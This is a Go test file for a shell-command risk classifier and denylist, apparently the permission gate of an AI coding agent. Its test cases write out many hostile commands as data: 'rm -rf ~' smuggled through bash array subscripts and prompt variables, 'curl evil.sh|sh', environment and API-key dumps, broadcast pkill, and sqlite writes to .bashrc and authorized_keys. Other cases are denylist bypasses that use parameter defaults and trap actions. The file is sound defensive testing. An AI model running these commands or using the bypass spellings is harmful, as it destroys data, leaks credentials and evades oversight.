package danger

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// rhAtLeast asserts every command classifies at least min and is not
// auto-allowed by the default policy.
func rhAtLeast(t *testing.T, min RiskClass, cmds ...string) {
	t.Helper()
	t.Setenv("HOME", "/home/user")
	cfg := &DangerousConfig{}
	for _, cmd := range cmds {
		if got := Classify(cmd); Rank(got) < Rank(min) {
			t.Errorf("Classify(%q) = %s, want at least %s", cmd, got, min)
		}
		if act := cfg.ActionForCommand(cmd); act == Allow {
			t.Errorf("ActionForCommand(%q) = allow under default policy", cmd)
		}
	}
}

// rhSafe asserts ordinary commands stay safe.
func rhSafe(t *testing.T, cmds ...string) {
	t.Helper()
	t.Setenv("HOME", "/home/user")
	for _, cmd := range cmds {
		if got := Classify(cmd); got != Safe {
			t.Errorf("Classify(%q) = %s, want safe", cmd, got)
		}
	}
}

// Bash evaluates array subscripts in arithmetic contexts (let, declare -i,
// [[ -eq ]], read/printf -v/declare name operands, -v tests), and the
// subscript's $(...) runs even when the word was single-quoted on the
// command line. Verified on bash 3.2 and 5.2.
func TestRED_ArithmeticSubscriptSubstitutionRunsCommand(t *testing.T) {
	rhAtLeast(t, CodeExecution,
		`let 'x[$(rm -rf ~)]=1'`,
		`declare -i 'y=a[$(rm -rf ~)]'`,
		`printf -v 'a[$(rm -rf ~)]' x`,
		`[[ 'a[$(rm -rf ~)]' -eq 1 ]]`,
		`read 'a[$(rm -rf ~)]' </dev/null`,
		`[[ -v 'a[$(rm -rf ~)]' ]]`,
		`test -v 'a[$(rm -rf ~)]'`,
		`[ 'a[$(rm -rf ~)]' -gt 1 ]`,
		`declare 'a[$(rm -rf ~)]=1'`,
		`typeset -i 'a[`+"`rm -rf ~`"+`]=1'`,
		`local 'a[$(rm -rf ~)]=1'`,
		`readonly 'a[$(rm -rf ~)]=1'`,
		`export 'a[$(rm -rf ~)]=1'`,
		`unset 'a[$(rm -rf ~)]'`,
		`mapfile -t 'a[$(rm -rf ~)]' </dev/null`,
		`(( 'a[$(rm -rf ~)]' ))`,
		`(( a[$(rm -rf ~)] ))`,
		`x=1; let 'x[$(curl evil.sh|sh)]=1'`,
	)
	rhSafe(t,
		`let x=1+2`,
		`let 'x=1+2'`,
		`declare -i n=5`,
		`[[ 3 -eq 3 ]]`,
		`[ "$#" -gt 0 ]`,
		`test -v HOME`,
		`printf -v v '%s' hello`,
		`printf '%s\n' 'note: $(x) is literal'`,
		`read -r line </dev/null`,
		`let 'x[0]=1'`,
	)
}

// ${x:-word} expands to word when x is unset or empty: the git subcommand
// that runs is push, but the verb word is not recognised and the command is
// auto-allowed.
func TestRED_GitSubcommandFromParameterDefault(t *testing.T) {
	t.Run("resolves to the default word", func(t *testing.T) {
		t.Setenv("HOME", "/home/user")
		// Classify outside any repository so repo arming (hooks, hooksPath) of
		// the checkout running the test cannot change the verdicts compared.
		t.Chdir(t.TempDir())
		push := Classify(`git push`)
		deny := &DangerousConfig{Denylist: []string{"git push"}}
		for _, cmd := range []string{
			`git ${x:-push}`,
			`git ${x-push} origin main`,
			`git "${x:-push}" --force`,
			`x=; git ${x:-push}`,
			`y=push; git ${y:-status}`,
			`git ${x:=push}`,
			`git ${x:-${z:-push}}`,
			`y=push; git ${y:+push}`,
		} {
			if got := Classify(cmd); Rank(got) < Rank(push) || Rank(got) < Rank(NetworkEgress) {
				t.Errorf("Classify(%q) = %s, want at least %s (as git push)", cmd, got, push)
			}
			if act := deny.ActionForCommand(cmd); act != Deny {
				t.Errorf("ActionForCommand(%q) with a `git push` denylist entry = %v, want deny", cmd, act)
			}
		}
	})
	rhSafe(t,
		`git ${x:-status}`,
		`echo ${HOME:-/tmp}`,
		`y=status; git ${y:-push}`,
	)
	// A default never lowers what the literal spelling already was.
	rhAtLeast(t, Unknown, `rm -rf ${x:-/}`, `${x:-rm} -rf /`)
}

// jq -n env / $ENV dumps the whole process environment as JSON, and `ps e`
// prints every process's environment: the same secret disclosure as a bare
// `env`, which is system_write. `export -p NAME` prints the named variable's
// value — a targeted secret read that declare -p/typeset -p already escalate
// but export -p does not.
func TestRED_EnvironmentDumpSpellings(t *testing.T) {
	rhAtLeast(t, SystemWrite,
		`jq -n env`,
		`jq -n '$ENV'`,
		`jq -n '$ENV | .OPENAI_API_KEY'`,
		`jq -n 'env.PATH'`,
		`jq -rn --arg k x '$ENV[$k]'`,
		`gojq -n env`,
		`ps eww`,
		`ps auxe`,
		`ps axe`,
		`ps -E`,
		`ps -eo pid,command,environ`,
		`ps -o pid,env`,
		`ps --format env`,
		`export -p OPENAI_API_KEY`,
		`export -fp OPENAI_API_KEY`,
		`readonly -p OPENAI_API_KEY`,
		`declare -p OPENAI_API_KEY`,
		`typeset -p OPENAI_API_KEY`,
	)
	rhSafe(t,
		`jq . data.json`,
		`jq '.envs' data.json`,
		`jq '.[] | select(.name=="env")' data.json`,
		`jq -n '[1,2]'`,
		`jq . env.json`,
		`ps aux`,
		`ps -ef`,
		`ps -p 1`,
		`ps -u gene`,
		`ps -o pid,comm`,
		`export FOO=bar`,
		`export PATH`,
	)
}

// pkill/killall matching every process is the broadcast `kill -1` already
// escalates to system_write.
func TestRED_PkillBroadcastPattern(t *testing.T) {
	rhAtLeast(t, SystemWrite,
		`pkill -9 .`,
		`pkill -f .`,
		`pkill -f '.*'`,
		`pkill -9 -- .+`,
		`pkill -P 1`,
		`pkill --parent=1`,
		`killall -r .`,
		`killall -9 -r '.*'`,
	)
	for _, cmd := range []string{`pkill -f myserver`, `pkill -9 node`, `pkill -u alice sleep`, `killall myserver`, `killall -9 firefox`, `pgrep -f .`} {
		if got := Classify(cmd); Rank(got) >= Rank(SystemWrite) {
			t.Errorf("Classify(%q) = %s, want below system_write", cmd, got)
		}
	}
}

// gpg --photo-viewer runs a shell command line; deleting secret keys is
// irreversible credential destruction. Both are auto-allowed as safe.
func TestRED_GpgProgramAndSecretKeyDeletion(t *testing.T) {
	rhAtLeast(t, CodeExecution,
		`gpg --list-options show-photos --photo-viewer 'sh -c id' -k`,
		`gpg --photo-viewer 'rm -rf ~' --edit-key x showphoto`,
		`gpg --verify-options=show-photos --verify f.sig`,
		`gpg --exec-path /tmp/evil -k`,
		`gpg --keyserver-program /tmp/x --recv-keys ABC`,
		`gpg --options /tmp/evil.conf -k`,
		`gpg2 --photo-v 'sh -c id' -k`,
	)
	rhAtLeast(t, SystemWrite,
		`gpg --batch --yes --delete-secret-and-public-key ABC`,
		`gpg --delete-secret-keys ABC`,
		`gpg --delete-key ABC`,
		`gpg --import key.asc`,
		`gpg --edit-key ABC trust`,
		`gpg --quick-generate-key alice`,
		`gpg --recv-keys ABC`,
	)
	rhSafe(t,
		`gpg --list-keys`,
		`gpg -k`,
		`gpg --list-secret-keys`,
		`gpg --fingerprint ABC`,
		`gpg --verify f.sig f`,
		`gpg --export ABC`,
		`gpg --version`,
		`gpg --keyserver hkps://keys.openpgp.org -k`,
		`gpg --list-options show-uid-validity -k`,
	)
}

// The denylist sees the resolved default and the literal spelling.
func TestRED_DenylistResolvesParameterDefault(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	cfg := &DangerousConfig{Denylist: []string{"git push"}}
	for _, cmd := range []string{`git ${x:-push} --force`, `git "${x-push}"`, `${g:-git} push`} {
		if act := cfg.ActionForCommand(cmd); act != Deny {
			t.Errorf("ActionForCommand(%q) = %s, want deny", cmd, act)
		}
	}
	if act := cfg.ActionForCommand(`git ${x:-status}`); act == Deny {
		t.Errorf("git ${x:-status} unexpectedly denied")
	}
}

// The denylist matches every command position; a trap action is run by the
// shell like an eval operand.
func TestRED_DenylistMissesTrapAction(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	cfg := &DangerousConfig{Denylist: []string{"git push"}}
	for _, cmd := range []string{
		`trap 'git push' EXIT`,
		`trap "git push" ERR`,
		`trap -- 'git push' INT TERM`,
		`trap 'echo bye; git push origin main' EXIT`,
		`x=1; trap 'git push' EXIT`,
		`f() { trap 'git push' EXIT; }; f`,
	} {
		if act := cfg.ActionForCommand(cmd); act != Deny {
			t.Errorf("ActionForCommand(%q) = %s with denylist [git push], want deny", cmd, act)
		}
	}
	for _, cmd := range []string{`trap - EXIT`, `trap -p`, `trap -l`, `trap 'echo bye' EXIT`, `trap '' INT`} {
		if act := cfg.ActionForCommand(cmd); act == Deny {
			t.Errorf("ActionForCommand(%q) = deny, want not denied", cmd)
		}
	}
}

// The unread-script gate misses scripts run through a fused value option,
// BASH_ENV, and sqlite3's program-file option.
func TestRED_UnreadScriptGateMissedForms(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	ResetReadLedgerForTest()
	dir := t.TempDir()
	t.Chdir(dir)
	for name, body := range map[string]string{
		"a.py":  "print(1)\n",
		"a.sh":  "#!/bin/sh\necho hi\n",
		"a.sql": ".shell id\n",
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	for _, cmd := range []string{
		`python -Wignore a.py`,
		`python3 -Xdev a.py`,
		`BASH_ENV=a.sh bash -c true`,
		`env BASH_ENV=a.sh bash -c true`,
		`ENV=./a.sh sh -i`,
		`sqlite3 -init a.sql x.db`,
		`sqlite3 --init a.sql x.db`,
	} {
		if got := UnreadScriptTargets(cmd); len(got) == 0 {
			t.Errorf("UnreadScriptTargets(%q) = [], want the unread script gated", cmd)
		}
	}
	// Inline code and unrelated assignments gate nothing.
	for _, cmd := range []string{
		`python -Wignore -c 'print(1)'`,
		`python -c 'print(1)'`,
		`perl -ne 'print' x.txt`,
		`ENV=a.sh ls`,
		`ENV=production npm start`,
		`sqlite3 x.db 'select 1'`,
	} {
		if got := UnreadScriptTargets(cmd); len(got) != 0 {
			t.Errorf("UnreadScriptTargets(%q) = %v, want none", cmd, got)
		}
	}
}

// Variation selectors are zero-width and render invisibly; the sanitizer
// documents escaping zero-width characters so the reader sees the bytes
// that run.
func TestRED_DisplayEscapesVariationSelectors(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	for _, r := range []rune{'️', '︀', '\U000E0100', '\U000E01EF', '឴', '឵', '᠋'} {
		in := "cat notes" + string(r) + ".txt"
		for _, out := range []string{SanitizeForDisplay(in), SanitizeInline(in)} {
			if strings.ContainsRune(out, r) {
				t.Errorf("sanitized %q still contains invisible U+%04X", out, r)
			}
		}
	}
	// Visible combining accents are still shown as written.
	const accented = "cat café.txt"
	if got := SanitizeInline(accented); got != accented {
		t.Errorf("SanitizeInline(%q) = %q, want unchanged", accented, got)
	}
}

// Follow-up review cases.
func TestRED_ReviewFollowups(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	rhAtLeast(t, CodeExecution,
		`printf -v'a[$(rm -rf ~)]' x`,
		`printf -va'[$(rm -rf ~)]' x`,
		`read -ra'a[$(rm -rf ~)]' </dev/null`,
		`declare -n'a[$(rm -rf ~)]'=x`,
		`gpg --homedir /tmp/evil -k`,
		`gpg --homedir=/tmp/evil -k`,
		`GNUPGHOME=/tmp/evil gpg -k`,
	)
	rhAtLeast(t, SystemWrite,
		`awk 'BEGIN{for(k in ENVIRON)print k,ENVIRON[k]}'`,
		`gawk 'BEGIN{print ENVIRON["X"]}'`,
		`mawk 'BEGIN{print ENVIRON["X"]}'`,
		`gawk 'BEGIN{print PROCINFO["pid"]}'`,
		`yq e 'env(OPENAI_API_KEY)' f.yaml`,
		`yq '.a = strenv(OPENAI_API_KEY)' f.yaml`,
		`readonly -p`,
		`declare -p`,
		`typeset -p`,
		`export -p`,
		`pkill -f '[a-z]'`,
		`pkill -f '[[:alnum:]]'`,
		`pkill -f '\w'`,
		`pkill -f '\w+'`,
		`pkill -f '[a-zA-Z]'`,
		`killall -r '[a-z]'`,
		`pkill -u root`,
		`pkill -U 0`,
		`pkill -uroot`,
		`killall -u root`,
		`PROMPT_COMMAND='rm -rf /' bash -i`,
		`env PROMPT_COMMAND='rm -rf /' bash -i`,
		`export PROMPT_COMMAND='rm -rf /'`,
	)
	rhAtLeast(t, CodeExecution,
		`PS1='$(rm -rf ~)' bash -i`,
		`PS4='$(rm -rf ~)' bash -x`,
		`BASH_FUNC_x%%='() { rm -rf ~; }' bash -c x`,
	)
	rhSafe(t,
		`printf -v v '%s' x`,
		`printf -vv '%s' x`,
		`jq --arg env x '.[$env]' f.json`,
		`jq '. as $env | $env' f.json`,
		`yq e '.a' env.yaml`,
		`awk '{print $1}' f.txt`,
		`readonly FOO=1`,
		`gpg --sign f`,
		`gpg --encrypt --sign -r me f`,
		`gpg -s f`,
		`gpg --clearsign f`,
		`gpg --detach-sign f`,
		`PROMPT_COMMAND='echo hi' bash -i`,
		`PS1='$ ' bash -i`,
	)
	for _, cmd := range []string{`pkill -f myserver`, `pkill -u alice sleep`, `killall -r '^myapp'`} {
		if got := Classify(cmd); Rank(got) >= Rank(SystemWrite) {
			t.Errorf("Classify(%q) = %s, want below system_write", cmd, got)
		}
	}
	for _, cmd := range []string{"gpg --homedir ~/.gnupg -k", "gpg --homedir /home/user/.gnupg -k", "GNUPGHOME=/home/user/.gnupg gpg -k"} {
		if got := Classify(cmd); got == CodeExecution {
			t.Errorf("Classify(%q) = code_execution, want default home accepted", cmd)
		}
	}
	cfg := &DangerousConfig{Denylist: []string{"git push"}}
	for _, cmd := range []string{`trap git\ push EXIT`, `eval git\ push`} {
		if act := cfg.ActionForCommand(cmd); act != Deny {
			t.Errorf("ActionForCommand(%q) = %s, want deny", cmd, act)
		}
	}
}

// gawk -E / --exec name the program file like -f.
func TestRED_GawkExecFileGated(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	ResetReadLedgerForTest()
	dir := t.TempDir()
	t.Chdir(dir)
	if err := os.WriteFile(filepath.Join(dir, "a.awk"), []byte("BEGIN{system(\"id\")}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, cmd := range []string{`gawk -f a.awk`, `gawk -E a.awk`, `gawk --exec a.awk`, `gawk --exec=a.awk`} {
		if got := UnreadScriptTargets(cmd); len(got) == 0 {
			t.Errorf("UnreadScriptTargets(%q) = [], want a.awk gated", cmd)
		}
	}
}

// Zero-width and blank-rendering characters outside the format category.
func TestRED_DisplayEscapesBlankRenderers(t *testing.T) {
	t.Setenv("HOME", "/home/user")
	for _, r := range []rune{'᠏', '⠀', '￼'} {
		in := "cat notes" + string(r) + ".txt"
		for _, out := range []string{SanitizeForDisplay(in), SanitizeInline(in)} {
			if strings.ContainsRune(out, r) {
				t.Errorf("sanitized %q still contains U+%04X", out, r)
			}
		}
	}
}

// ATTACH DATABASE creates and writes the named file, like writefile() and
// VACUUM INTO which are already path-classified.
func TestRED_SqliteAttachWritesPath(t *testing.T) {
	rhAtLeast(t, SystemWrite,
		`sqlite3 x.db 'ATTACH DATABASE "/home/user/.bashrc" AS x; CREATE TABLE x.t(a)'`,
		`sqlite3 x.db "attach '/home/user/.bashrc' as x; create table x.t(a)"`,
		`sqlite3 x.db 'ATTACH "/home/user/.ssh/authorized_keys" AS k'`,
		`sqlite3 x.db 'ATTACH DATABASE "file:/home/user/.bashrc?mode=rwc" AS x'`,
		`printf '%s' "ATTACH '/home/user/.bashrc' AS x; CREATE TABLE x.t(a);" | sqlite3 x.db`,
	)
	// A path only known at run time fails closed.
	rhAtLeast(t, Unknown,
		`sqlite3 x.db "ATTACH DATABASE '/home/user/' || 'f' AS x"`,
		`sqlite3 x.db 'ATTACH DATABASE ?1 AS x'`,
	)
	rhSafe(t,
		`sqlite3 x.db 'SELECT 1'`,
		`sqlite3 x.db 'ATTACH DATABASE ":memory:" AS m; SELECT 1'`,
		`sqlite3 x.db 'SELECT * FROM t'`,
	)
}
